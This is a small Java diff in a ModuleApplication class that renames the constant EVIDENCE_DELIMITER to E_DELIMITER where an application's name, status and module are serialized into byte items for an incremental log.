@@ -83,7 +83,7 @@ public class ModuleApplication extends BaseModule implements IncrementalLog, Obs
 		items.add(WChar.getBytes(name, true));
 		items.add(WChar.getBytes(status.name(), true));
 		items.add(WChar.getBytes(module, true));
-		items.add(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
+		items.add(Utils.intToByteArray(Evidence.E_DELIMITER));
 
 		if (Cfg.DEBUG) {
 			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
